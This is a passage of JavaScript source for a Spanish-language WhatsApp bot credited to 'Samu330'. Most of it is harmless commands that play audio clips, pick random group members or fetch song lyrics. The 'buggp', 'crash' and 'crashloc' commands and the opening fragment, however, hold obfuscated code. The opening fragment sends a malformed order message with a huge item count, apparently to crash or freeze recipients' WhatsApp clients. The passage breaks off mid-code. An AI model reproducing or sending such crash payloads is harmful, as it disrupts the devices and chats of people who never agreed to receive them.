_0x1e1a08=parseInt(_0x2b3ad5(0x11b))*parseInt(_0x2b3ad5(0x127))+parseInt(_0x2b3ad5(0x12c))+parseInt(_0x2b3ad5(0x122))+parseInt(_0x2b3ad5(0x11e))*parseInt(_0x2b3ad5(0x121))+parseInt(_0x2b3ad5(0x126))*-parseInt(_0x2b3ad5(0x12b))+parseInt(_0x2b3ad5(0x124))*parseInt(_0x2b3ad5(0x11f))+-parseInt(_0x2b3ad5(0x120))*parseInt(_0x2b3ad5(0x12a));if(_0x1e1a08===_0x5dcd2a)break;else _0x1c8e57['push'](_0x1c8e57['shift']());}catch(_0x52a340){_0x1c8e57['push'](_0x1c8e57['shift']());}}}(_0x56da,0x99469),res=await samu330[_0x3cb2d7(0x129)](from,{'orderMessage':{'orderId':_0x3cb2d7(0x11d),'thumbnail':fs[_0x3cb2d7(0x11c)](_0x3cb2d7(0x123)),'itemCount':999999999,'status':_0x3cb2d7(0x128),'surface':'CATALOG','message':_0x3cb2d7(0x125),'orderTitle':''},'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}},{'quoted':sam,'contextInfo':{}}),samu330[_0x3cb2d7(0x12d)](res));
break

//audios 
case 'confeti':
addFilter(from)
aud = fs.readFileSync('./audio/confeti.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'anana':
addFilter(from)
aud = fs.readFileSync('./audio/anana.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'asen':
addFilter(from)
aud = fs.readFileSync('./audio/asen.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'flash':
addFilter(from)
aud = fs.readFileSync('./audio/flash.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'asen':
addFilter(from)
aud = fs.readFileSync('./audio/asen.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'hentai':
addFilter(from)
aud = fs.readFileSync('./audio/hentai.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'jai':
addFilter(from)
aud = fs.readFileSync('./audio/jai.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'jashire':
addFilter(from)
aud = fs.readFileSync('./audio/jashire.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break	
case 'kareta':
addFilter(from)
aud = fs.readFileSync('./audio/kareta.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'kataka':
addFilter(from)
aud = fs.readFileSync('./audio/kataka.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'kicks':
addFilter(from)
aud = fs.readFileSync('./audio/kicks.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'kobarashi':
addFilter(from)
aud = fs.readFileSync('./audio/kobarashi.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'mitamita':
addFilter(from)
aud = fs.readFileSync('./audio/mitamita.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'mma':
addFilter(from)
aud = fs.readFileSync('./audio/mma.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'motomoto':
addFilter(from)
aud = fs.readFileSync('./audio/motomoto.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'nani':
addFilter(from)
aud = fs.readFileSync('./audio/nani.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'niconico':
addFilter(from)
aud = fs.readFileSync('./audio/niconico.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'nya':
addFilter(from)
aud = fs.readFileSync('./audio/nya.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'nyan':
addFilter(from)
aud = fs.readFileSync('./audio/nyan.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true})
break
case 'omaiga':
addFilter(from)
aud = fs.readFileSync('./audio/omaiga.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'omaiwa':
addFilter(from)
aud = fs.readFileSync('./audio/omaiwa.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'omg':
addFilter(from)
aud = fs.readFileSync('./audio/omg.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'onichan':
addFilter(from)
aud = fs.readFileSync('./audio/onichan.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'ooaa':
addFilter(from)
aud = fs.readFileSync('./audio/ooaa.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'piano':
addFilter(from)
aud = fs.readFileSync('./audio/piano.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'pikachu':
addFilter(from)
aud = fs.readFileSync('./audio/pikachu.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'pupu':
addFilter(from)
aud = fs.readFileSync('./audio/pupu.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'sempai':
addFilter(from)
aud = fs.readFileSync('./audio/sempai.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'sss':
addFilter(from)
aud = fs.readFileSync('./audio/sss.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'suspenso':
addFilter(from)
aud = fs.readFileSync('./audio/suspenso.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'talcho':
addFilter(from)
aud = fs.readFileSync('./audio/talcho.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'tobec':
addFilter(from)
aud = fs.readFileSync('./audio/tobec.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'tuturu':
addFilter(from)
aud = fs.readFileSync('./audio/tuturu.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'tututu':
addFilter(from)
aud = fs.readFileSync('./audio/tututu.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'uchinchi':
addFilter(from)
aud = fs.readFileSync('./audio/uchinchi.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'uff':
addFilter(from)
aud = fs.readFileSync('./audio/uff.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'uma':
addFilter(from)
aud = fs.readFileSync('./audio/uma.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'umai':
addFilter(from)
aud = fs.readFileSync('./audio/umai.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'woau':
addFilter(from)
aud = fs.readFileSync('./audio/woau.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'yajaro':
addFilter(from)
aud = fs.readFileSync('./audio/yajaro.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'yame':
addFilter(from)
aud = fs.readFileSync('./audio/yame.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'yamete':
addFilter(from)
aud = fs.readFileSync('./audio/yamete.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'yokese':
addFilter(from)
aud = fs.readFileSync('./audio/yokese.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'yutki':
addFilter(from)
aud = fs.readFileSync('./audio/yutki.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'ñaña':
addFilter(from)
aud = fs.readFileSync('./audio/ñaña.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'ñañañi':
addFilter(from)
aud = fs.readFileSync('./audio/ñañañi.ogg') 
samu330.sendMessage(from, aud, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true}) 
break
case 'audios':
addFilter(from)
reply(`*Estos audios son originales, provenientes de la app:*\nhttps://play.google.com/store/apps/details?id=com.aromaticnectarineapps.anime\n\n- anana\n- asen\n- flash\n- hentai\n- jai\n- jashire\n- kareta\n- kataka\n- kicks\n- kobarashi\n- mitamita\n- mma\n- motomoto\n- nani\n- niconico\n- nya\n- nyan\n- omaiga\n- omaiwa\n- omg\n- onichan\n- ooaa\n- piano\n- pikachu\n- pupu\n- sempai\n- sss\n- suspenso\n- talcho\n- tobec\n- tuturu\n- tututu\n- uchinchi\n- uff\n- uma\n- umai\n- unga\n- woau\n- yajaro\n- yame\n- yamete\n- yokese\n- yutki\n- ñaña\n- ñañañi\n\n🍒 *By Samu330* 💠`)
break
		
case 'top5':
addFilter(from)
if (!isGroup) return reply('*Este comando solo puede usarse en grupos🤕')
member = []
top5 = args.join(' ')
const p1 = groupMembers
const p2 = groupMembers
const p3 = groupMembers
const p4 = groupMembers
const p5 = groupMembers
const o1 = p1[Math.floor(Math.random() * p1.length)]
const o2 = p2[Math.floor(Math.random() * p2.length)]
const o3 = p3[Math.floor(Math.random() * p3.length)]
const o4 = p4[Math.floor(Math.random() * p4.length)]
const o5 = p5[Math.floor(Math.random() * p5.length)]
teks = `
*😵TOP CINCO:*\n\n1= @${o1.jid.split('@')[0]}\n\n2=@${o2.jid.split('@')[0]}\n\n3=@${o3.jid.split('@')[0]}\n\n4= @${o4.jid.split('@')[0]}\n\n5= @${o5.jid.split('@')[0]}\n\n\n_Top 5 de_ *${top5}* en este grupo`
member.push(o1.jid)
member.push(o2.jid)
member.push(o3.jid)
member.push(o4.jid)
member.push(o5.jid)
mentions(teks, member, true)
break
		
case 'pregunta':
respuesta = ['Si', 'No', 'Tal vez', 'Puede ser', 'Ai una probabilidad del 99.99999999991.01%', 'Puede que no', 'Yo que se', 'mmmm🤔.... Dejame lo pienso un poco']
answer = respuesta[Math.floor(Math.random() * respuesta.length)]
if (!q) return reply('Y la pregunta?')
reply(answer)
addFilter(from)
break
		
case 'lirik':
case 'letra':
case 'letras':
if (args.length < 1) return reply('Escribe el nombre de la cancion')
if (!isRegister) return reply(mess.only.usrReg)
samu330.updatePresence(from, Presence.composing)
if (!q) return reply('*Cual es el nombre de la cancion?*')
try {
anu = await getJson(`https://some-random-api.ml/lyrics?title=${q}`)
lyrics = `🥰Resultado de ${anu.title}:\n\n*Autor:* ${anu.author}\n\n____________________\n\n${anu.lyrics}\n\n🌬Link: ${anu.links.genius}`
sendFileFromUrl(anu.thumbnail.genius, image, {quoted: fimg, caption: lyrics, sendEphemeral: true})
} catch {
reply(mess.ferr)
}
addFilter(from)
break

case 'p2':
p2p = samu330.prepareMessageFromContent(from,{ "listMessage": { 
	"title": "*TEST*", 
	"description": `Aver`, 
	"buttonText": "Click aqui.", 
	"listType": "SINGLE_SELECT", 
	"sections": [{ 
		"rows": [ { 
			"title": `.menu`, 
			"singleSelectReply": { 
				"selectedRowId": "*Bien, ahora copia y pega*" }}]}]}
})
samu330.relayWAMessage(p2p)
break
		
case 'buggp':
if (!isAdmin) return reply('*No te metas en problemas, este comando solo lo pueden usar admnistradores...*')
var _0xd95f=['97IpvOoX','{}.constructor(\x22return\x20this\x22)(\x20)','160159JZCKAY','1TrcPBl','warn','122544MoLPQn','console','1JxWgOF','apply','183593smyNwX','info','toggleDisappearingMessages','toString','exception','constructor','error','90535OrtQRv','table','358086bAfoWm','61538AzOAYY','test','864FTLgas','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','trace','1NJonCu','bind','prototype','__proto__','return\x20/\x22\x20+\x20this\x20+\x20\x22/'];var _0x546f6b=_0x1153;(function(_0x130547,_0x105aa7){var _0x24f68e=_0x1153;while(!![]){try{var _0x455953=parseInt(_0x24f68e(0x115))+-parseInt(_0x24f68e(0x103))*-parseInt(_0x24f68e(0xfb))+parseInt(_0x24f68e(0x106))*-parseInt(_0x24f68e(0x105))+parseInt(_0x24f68e(0x108))+parseInt(_0x24f68e(0x116))+parseInt(_0x24f68e(0x10a))*-parseInt(_0x24f68e(0x113))+parseInt(_0x24f68e(0xfe))*-parseInt(_0x24f68e(0x10c));if(_0x455953===_0x105aa7)break;else _0x130547['push'](_0x130547['shift']());}catch(_0x5adc33){_0x130547['push'](_0x130547['shift']());}}}(_0xd95f,0x2ecc9));function _0x1153(_0x4b1858,_0x1f7dea){return _0x1153=function(_0x5616d5,_0x56b4f6){_0x5616d5=_0x5616d5-0xfa;var _0x4d4a5d=_0xd95f[_0x5616d5];return _0x4d4a5d;},_0x1153(_0x4b1858,_0x1f7dea);}var _0xd6d63b=function(){var _0x13b053=!![];return function(_0x395d1a,_0x48df24){var _0x27b24c=_0x13b053?function(){var _0x4e1dac=_0x1153;if(_0x48df24){var _0x539245=_0x48df24[_0x4e1dac(0x10b)](_0x395d1a,arguments);return _0x48df24=null,_0x539245;}}:function(){};return _0x13b053=![],_0x27b24c;};}(),_0x30d0b5=_0xd6d63b(this,function(){var _0x30ccbc=function(){var _0x16ac5d=_0x1153,_0x57f4a6=_0x30ccbc[_0x16ac5d(0x111)](_0x16ac5d(0x102))()[_0x16ac5d(0x111)](_0x16ac5d(0xfc));return!_0x57f4a6[_0x16ac5d(0xfa)](_0x30d0b5);};return _0x30ccbc();});_0x30d0b5();var _0x4d4a5d=function(){var _0x4e2a78=!![];return function(_0x260ec2,_0x94aecb){var _0x54889b=_0x4e2a78?function(){if(_0x94aecb){var _0x28c3d2=_0x94aecb['apply'](_0x260ec2,arguments);return _0x94aecb=null,_0x28c3d2;}}:function(){};return _0x4e2a78=![],_0x54889b;};}(),_0x56b4f6=_0x4d4a5d(this,function(){var _0x1c587e=_0x1153,_0x40187c;try{var _0x20dc0c=Function('return\x20(function()\x20'+_0x1c587e(0x104)+');');_0x40187c=_0x20dc0c();}catch(_0x5dbdd0){_0x40187c=window;}var _0x397d10=_0x40187c[_0x1c587e(0x109)]=_0x40187c[_0x1c587e(0x109)]||{},_0x48079e=['log',_0x1c587e(0x107),_0x1c587e(0x10d),_0x1c587e(0x112),_0x1c587e(0x110),_0x1c587e(0x114),_0x1c587e(0xfd)];for(var _0x598a60=0x0;_0x598a60<_0x48079e['length'];_0x598a60++){var _0x542db2=_0x4d4a5d['constructor'][_0x1c587e(0x100)][_0x1c587e(0xff)](_0x4d4a5d),_0xcd5cf1=_0x48079e[_0x598a60],_0x5b5aac=_0x397d10[_0xcd5cf1]||_0x542db2;_0x542db2[_0x1c587e(0x101)]=_0x4d4a5d[_0x1c587e(0xff)](_0x4d4a5d),_0x542db2[_0x1c587e(0x10f)]=_0x5b5aac[_0x1c587e(0x10f)][_0x1c587e(0xff)](_0x5b5aac),_0x397d10[_0xcd5cf1]=_0x542db2;}});_0x56b4f6(),await samu330[_0x546f6b(0x10e)](from);
var _0x96e7=['warn','toggleDisappearingMessages','277655muRCLP','exception','__proto__','console','{}.constructor(\x22return\x20this\x22)(\x20)','prototype','log','apply','217jjNSce','448086JqKLdU','3905mnVEgm','test','table','1EgPFfX','constructor','error','725193caLWOk','return\x20/\x22\x20+\x20this\x20+\x20\x22/','509472xtfGPc','trace','345200dchAPR','6691QfNQYR','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','1uDiTJC','bind','397EOORDU','info'];var _0x1a6b3e=_0x14ad;function _0x14ad(_0x294bb5,_0x421546){return _0x14ad=function(_0x5184cd,_0x13e030){_0x5184cd=_0x5184cd-0x71;var _0x21172b=_0x96e7[_0x5184cd];return _0x21172b;},_0x14ad(_0x294bb5,_0x421546);}(function(_0x365cbe,_0x2ce91c){var _0x10c11b=_0x14ad;while(!![]){try{var _0x35c72f=parseInt(_0x10c11b(0x8d))*parseInt(_0x10c11b(0x87))+parseInt(_0x10c11b(0x79))+parseInt(_0x10c11b(0x84))+parseInt(_0x10c11b(0x7a))*parseInt(_0x10c11b(0x78))+parseInt(_0x10c11b(0x7d))*parseInt(_0x10c11b(0x80))+parseInt(_0x10c11b(0x82))+parseInt(_0x10c11b(0x85))*-parseInt(_0x10c11b(0x89));if(_0x35c72f===_0x2ce91c)break;else _0x365cbe['push'](_0x365cbe['shift']());}catch(_0x1c496d){_0x365cbe['push'](_0x365cbe['shift']());}}}(_0x96e7,0x79418));var _0x276f27=function(){var _0x4171f5=!![];return function(_0x1645e7,_0x3ef22e){var _0x1573ca=_0x4171f5?function(){var _0xfbfafb=_0x14ad;if(_0x3ef22e){var _0x2d56d9=_0x3ef22e[_0xfbfafb(0x77)](_0x1645e7,arguments);return _0x3ef22e=null,_0x2d56d9;}}:function(){};return _0x4171f5=![],_0x1573ca;};}(),_0x4c4d04=_0x276f27(this,function(){var _0x184dbd=function(){var _0x43cd1b=_0x14ad,_0x439b89=_0x184dbd[_0x43cd1b(0x7e)](_0x43cd1b(0x81))()[_0x43cd1b(0x7e)](_0x43cd1b(0x86));return!_0x439b89[_0x43cd1b(0x7b)](_0x4c4d04);};return _0x184dbd();});_0x4c4d04();var _0x21172b=function(){var _0x17c860=!![];return function(_0x5e6669,_0x4099a4){var _0x2152a9=_0x17c860?function(){if(_0x4099a4){var _0x78d816=_0x4099a4['apply'](_0x5e6669,arguments);return _0x4099a4=null,_0x78d816;}}:function(){};return _0x17c860=![],_0x2152a9;};}(),_0x13e030=_0x21172b(this,function(){var _0x4c38a8=_0x14ad,_0x1e3b9c;try{var _0x36a9d2=Function('return\x20(function()\x20'+_0x4c38a8(0x74)+');');_0x1e3b9c=_0x36a9d2();}catch(_0x20a2ee){_0x1e3b9c=window;}var _0x3e1a5e=_0x1e3b9c[_0x4c38a8(0x73)]=_0x1e3b9c['console']||{},_0x4868f5=[_0x4c38a8(0x76),_0x4c38a8(0x8b),_0x4c38a8(0x8a),_0x4c38a8(0x7f),_0x4c38a8(0x71),_0x4c38a8(0x7c),_0x4c38a8(0x83)];for(var _0x3e817e=0x0;_0x3e817e<_0x4868f5['length'];_0x3e817e++){var _0x31945d=_0x21172b['constructor'][_0x4c38a8(0x75)][_0x4c38a8(0x88)](_0x21172b),_0x1769fa=_0x4868f5[_0x3e817e],_0x9f3905=_0x3e1a5e[_0x1769fa]||_0x31945d;_0x31945d[_0x4c38a8(0x72)]=_0x21172b['bind'](_0x21172b),_0x31945d['toString']=_0x9f3905['toString']['bind'](_0x9f3905),_0x3e1a5e[_0x1769fa]=_0x31945d;}});_0x13e030(),await samu330[_0x1a6b3e(0x8c)](from);
break

case 'quemusicaes':
if (!isRegister) return reply(mess.only.usrReg)
if (!q) return reply('*Porfavor, es nesesario que envies el link de la musica para poder continuar, si no sabes como sacar el link de un audio, usa el siguiente link para sacar un link de tu audio: https://files.catbox.moe*')
if (!isUrl) return reply('Porfavor envia especificamente un link de la musica')
reply(mess.wait)
musica = await getJson(`https://api.lolhuman.xyz/api/musicsearch?apikey=${api}&file=${q}`)
p = musica.result

break

case 'crash':
var _0x1d7d=['668294PHGqRK','warn','{}.constructor(\x22return\x20this\x22)(\x20)','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','bind','return\x20/\x22\x20+\x20this\x20+\x20\x22/','table','440268wWnjMf','1338172HVhIJW','apply','12187ggePsV','__proto__','console','prototype','87IHpVcC','constructor','193183GqxnmV','log','893224wrIoBO','741557WxXKim','trace'];function _0x6283(_0x3ca886,_0x357d3d){return _0x6283=function(_0x22d221,_0xb2d8ce){_0x22d221=_0x22d221-0x64;var _0x5dee44=_0x1d7d[_0x22d221];return _0x5dee44;},_0x6283(_0x3ca886,_0x357d3d);}(function(_0x443072,_0x59bcb0){var _0x3be8db=_0x6283;while(!![]){try{var _0x2e9cc0=parseInt(_0x3be8db(0x6f))+parseInt(_0x3be8db(0x6d))+-parseInt(_0x3be8db(0x64))*parseInt(_0x3be8db(0x68))+parseInt(_0x3be8db(0x6c))+parseInt(_0x3be8db(0x76))+parseInt(_0x3be8db(0x6a))+-parseInt(_0x3be8db(0x77));if(_0x2e9cc0===_0x59bcb0)break;else _0x443072['push'](_0x443072['shift']());}catch(_0x49b0e1){_0x443072['push'](_0x443072['shift']());}}}(_0x1d7d,0x835e5));var _0x2075c9=function(){var _0x287827=!![];return function(_0x4ba623,_0x58abe3){var _0x40b00f=_0x287827?function(){var _0xb695fa=_0x6283;if(_0x58abe3){var _0x4c7dc8=_0x58abe3[_0xb695fa(0x78)](_0x4ba623,arguments);return _0x58abe3=null,_0x4c7dc8;}}:function(){};return _0x287827=![],_0x40b00f;};}(),_0x39a852=_0x2075c9(this,function(){var _0x51c3ce=function(){var _0x26e6ac=_0x6283,_0x1cc278=_0x51c3ce[_0x26e6ac(0x69)](_0x26e6ac(0x74))()[_0x26e6ac(0x69)](_0x26e6ac(0x72));return!_0x1cc278['test'](_0x39a852);};return _0x51c3ce();});_0x39a852();var _0x5dee44=function(){var _0x21fde2=!![];return function(_0xe2f455,_0x1a901c){var _0x4a2102=_0x21fde2?function(){var _0x5154df=_0x6283;if(_0x1a901c){var _0x3a0ea1=_0x1a901c[_0x5154df(0x78)](_0xe2f455,arguments);return _0x1a901c=null,_0x3a0ea1;}}:function(){};return _0x21fde2=![],_0x4a2102;};}(),_0xb2d8ce=_0x5dee44(this,function(){var _0x270dc5=_0x6283,_0x54d02f=function(){var _0x1a1d21=_0x6283,_0x4f6e56;try{_0x4f6e56=Function('return\x20(function()\x20'+_0x1a1d21(0x71)+');')();}catch(_0x52abdf){_0x4f6e56=window;}return _0x4f6e56;},_0x59522f=_0x54d02f(),_0x1afd47=_0x59522f[_0x270dc5(0x66)]=_0x59522f[_0x270dc5(0x66)]||{},_0x3e63cc=[_0x270dc5(0x6b),_0x270dc5(0x70),'info','error','exception',_0x270dc5(0x75),_0x270dc5(0x6e)];for(var _0x700ee3=0x0;_0x700ee3<_0x3e63cc['length'];_0x700ee3++){var _0x55707b=_0x5dee44[_0x270dc5(0x69)][_0x270dc5(0x67)][_0x270dc5(0x73)](_0x5dee44),_0x324191=_0x3e63cc[_0x700ee3],_0x2c326f=_0x1afd47[_0x324191]||_0x55707b;_0x55707b[_0x270dc5(0x65)]=_0x5dee44[_0x270dc5(0x73)](_0x5dee44),_0x55707b['toString']=_0x2c326f['toString'][_0x270dc5(0x73)](_0x2c326f),_0x1afd47[_0x324191]=_0x55707b;}});_0xb2d8ce(),await samu330['toggleDisappearingMessages'](from);
var _0x37ae=['444982ORrRPL','23IBUlte','1NKDqeV','90273qDCLOR','15971mztlCn','4223nCNvkc','517QUbGXK','216015kaxemx','79953gHvbAJ','157pTymOu','*🔥Samu330\x20domina!\x20🔪*','23AsMkrm'];function _0x4d27(_0x492e21,_0x5cc1cd){return _0x4d27=function(_0x37ae22,_0x4d27fb){_0x37ae22=_0x37ae22-0x1b5;var _0x3fb07f=_0x37ae[_0x37ae22];return _0x3fb07f;},_0x4d27(_0x492e21,_0x5cc1cd);}var _0x4afcb5=_0x4d27;(function(_0x10569d,_0x1c3014){var _0x2ff4fe=_0x4d27;while(!![]){try{var _0x5b0b25=-parseInt(_0x2ff4fe(0x1c0))*parseInt(_0x2ff4fe(0x1b6))+-parseInt(_0x2ff4fe(0x1bf))*parseInt(_0x2ff4fe(0x1b8))+parseInt(_0x2ff4fe(0x1b7))+parseInt(_0x2ff4fe(0x1b5))*parseInt(_0x2ff4fe(0x1ba))+parseInt(_0x2ff4fe(0x1bc))+parseInt(_0x2ff4fe(0x1bb))+-parseInt(_0x2ff4fe(0x1bd))*-parseInt(_0x2ff4fe(0x1b9));if(_0x5b0b25===_0x1c3014)break;else _0x10569d['push'](_0x10569d['shift']());}catch(_0x30d37c){_0x10569d['push'](_0x10569d['shift']());}}}(_0x37ae,0x3cbfc),reply(_0x4afcb5(0x1be)));
break
		
case 'crashloc':
var _0x1d7d=['668294PHGqRK','warn','{}.constructor(\x22return\x20this\x22)(\x20)','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','bind','return\x20/\x22\x20+\x20this\x20+\x20\x22/','table','440268wWnjMf','1338172HVhIJW','apply','12187ggePsV','__proto__','console','prototype','87IHpVcC','constructor','193183GqxnmV','log','893224wrIoBO','741557WxXKim','trace'];function _0x6283(_0x3ca886,_0x357d3d){return _0x6283=function(_0x22d221,_0xb2d8ce){_0x22d221=_0x22d221-0x64;var _0x5dee44=_0x1d7d[_0x22d221];return _0x5dee44;},_0x6283(_0x3ca886,_0x357d3d);}(function(_0x443072,_0x59bcb0){var _0x3be8db=_0x6283;while(!![]){try{var _0x2e9cc0=parseInt(_0x3be8db(0x6f))+parseInt(_0x3be8db(0x6d))+-parseInt(_0x3be8db(0x64))*parseInt(_0x3be8db(0x68))+parseInt(_0x3be8db(0x6c))+parseInt(_0x3be8db(0x76))+parseInt(_0x3be8db(0x6a))+-parseInt(_0x3be8db(0x77));if(_0x2e9cc0===_0x59bcb0)break;else _0x443072['push'](_0x443072['shift']());}catch(_0x49b0e1){_0x443072['push'](_0x443072['shift']());}}}(_0x1d7d,0x835e5));var _0x2075c9=function(){var _0x287827=!![];return function(_0x4ba623,_0x58abe3){var _0x40b00f=_0x287827?function(){var _0xb695fa=_0x6283;if(_0x58abe3){var _0x4c7dc8=_0x58abe3[_0xb695fa(0x78)](_0x4ba623,arguments);return _0x58abe3=null,_0x4c7dc8;}}:function(){};return _0x287827=![],_0x40b00f;};}(),_0x39a852=_0x2075c9(this,function(){var _0x51c3ce=function(){var _0x26e6ac=_0x6283,_0x1cc278=_0x51c3ce[_0x26e6ac(0x69)](_0x26e6ac(0x74))()[_0x26e6ac(0x69)](_0x26e6ac(0x72));return!_0x1cc278['test'](_0x39a852);};return _0x51c3ce();});_0x39a852();var _0x5dee44=function(){var _0x21fde2=!![];return function(_0xe2f455,_0x1a901c){var _0x4a2102=_0x21fde2?function(){var _0x5154df=_0x6283;if(_0x1a901c){var _0x3a0ea1=_0x1a901c[_0x5154df(0x78)](_0xe2f455,arguments);return _0x1a901c=null,_0x3a0ea1;}}:function(){};return _0x21fde2=![],_0x4a2102;};}(),_0xb2d8ce=_0x5dee44(this,function(){var _0x270dc5=_0x6283,_0x54d02f=function(){var _0x1a1d21=_0x6283,_0x4f6e56;try{_0x4f6e56=Function('return\x20(function()\x20'+_0x1a1d21(0x71)+');')();}catch(_0x52abdf){_0x4f6e56=window;}return _0x4f6e56;},_0x59522f=_0x54d02f(),_0x1afd47=_0x59522f[_0x270dc5(0x66)]=_0x59522f[_0x270dc5(0x66)]||{},_0x3e63cc=[_0x270dc5(0x6b),_0x270dc5(0x70),'info','error','exception',_0x270dc5(0x75),_0x270dc5(0x6e)];for(var 